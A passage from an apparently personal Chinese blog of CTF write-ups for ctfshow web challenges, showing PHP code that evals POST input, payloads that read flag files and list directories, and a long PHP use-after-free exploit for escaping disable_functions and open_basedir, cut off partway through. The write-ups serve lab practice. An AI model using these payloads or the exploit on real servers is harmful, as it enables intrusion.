class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>看似所有的路都被堵死了</code></p><p>如何构造出36才是重点,呜呜呜呜</p><p><strong>bash下面其实也是有无字母数字rce的~</strong></p><p><a href="https://www.freebuf.com/articles/system/361101.html">【bashfuck】bashshell无字母命令执行原理 - FreeBuf网络安全行业门户</a></p><blockquote><p><strong>Web58</strong></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><strong>存在禁用函数的waf,想到用文件包含或者直接highlight_file(flag.php)</strong></p><blockquote><p><strong>web71</strong>,多了一个啥玩意ob_end_clean();函数</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure><p>看了题解发现可以用提前截断的思路!</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">提前送出缓冲区或终止程序</span><br><span class="line"></span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);</span><br><span class="line"></span><br><span class="line">源码劫持了输出缓冲并且将数字和字母替换成了?。</span><br><span class="line">法一</span><br><span class="line"></span><br><span class="line">在劫持输出缓冲区之前就把缓冲区送出，可以用的函数有：</span><br><span class="line"></span><br><span class="line">ob_flush();</span><br><span class="line">ob_end_flush();</span><br><span class="line"></span><br><span class="line">payload示例：</span><br><span class="line"></span><br><span class="line">c=include(&#x27;/flag.txt&#x27;);ob_flush();</span><br><span class="line"></span><br><span class="line">法二</span><br><span class="line"></span><br><span class="line">提前终止程序，即执行完代码直接退出，可以调用的函数有：</span><br><span class="line"></span><br><span class="line">exit();</span><br><span class="line">die();</span><br><span class="line"></span><br><span class="line">payload示例：</span><br><span class="line"></span><br><span class="line">c=include(&#x27;/flag.txt&#x27;);exit();</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p><strong>Web72</strong>,限制  open_basedir() 无法访问其他目录文件</p></blockquote><p><code>bypass open_basedir()</code> </p><p><code>uaf poc</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//报错提示</span></span><br><span class="line">Warning: <span class="title function_ invoke__">error_reporting</span>() has been disabled <span class="keyword">for</span> security reasons in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">14</span></span><br><span class="line"></span><br><span class="line">Warning: <span class="title function_ invoke__">ini_set</span>() has been disabled <span class="keyword">for</span> security reasons in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">15</span></span><br><span class="line"></span><br><span class="line">Warning: <span class="keyword">include</span>(/flag.txt): failed to open stream: No such file <span class="keyword">or</span> directory in /<span class="keyword">var</span>/www/html/index.<span class="title function_ invoke__">php</span>(<span class="number">19</span>) : <span class="keyword">eval</span>()<span class="string">&#x27;d code on line 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Warning: include(): Failed opening &#x27;</span>/flag.txt<span class="string">&#x27; for inclusion (include_path=&#x27;</span>.:/usr/local/lib/php<span class="string">&#x27;) in /var/www/html/index.php(19) : eval()&#x27;</span>d code on line <span class="number">1</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//查看flag 文件的位置</span></span><br><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>); <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>) &#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);&#125; <span class="keyword">exit</span>(<span class="number">0</span>); <span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//绕过脚本,待研究!</span></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span 